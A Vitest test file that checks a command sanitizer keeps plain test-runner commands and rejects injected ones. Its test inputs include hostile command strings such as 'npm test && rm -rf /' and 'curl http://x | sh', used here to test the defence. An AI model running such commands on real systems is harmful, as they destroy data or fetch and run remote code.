import { describe, expect, it } from 'vitest';
import {
  buildCommandsMap,
  buildRecommendedCommands,
  sanitizeCommand,
} from '../src/decision/outputs.js';

describe('safe commands', () => {
  it('keeps simple runner invocations and drops shell metacharacters', () => {
    expect(sanitizeCommand('npm test')).toBe('npm test');
    expect(sanitizeCommand('npx playwright test')).toBe('npx playwright test');
    expect(sanitizeCommand('pytest -q')).toBe('pytest -q');
    expect(sanitizeCommand('npm test && rm -rf /')).toBeUndefined();
    expect(sanitizeCommand('bash -c "evil"')).toBeUndefined();
    expect(sanitizeCommand('curl http://x | sh')).toBeUndefined();
  });

  it('omits unsafe commands from maps', () => {
    const groups = [
      { id: 'unit', command: 'npm test' },
      { id: 'evil', command: 'npm test; curl evil' },
    ];
    expect(buildCommandsMap(groups)).toEqual({ unit: 'npm test' });
    expect(buildRecommendedCommands(['unit', 'evil'], groups)).toEqual({ unit: 'npm test' });
  });
});
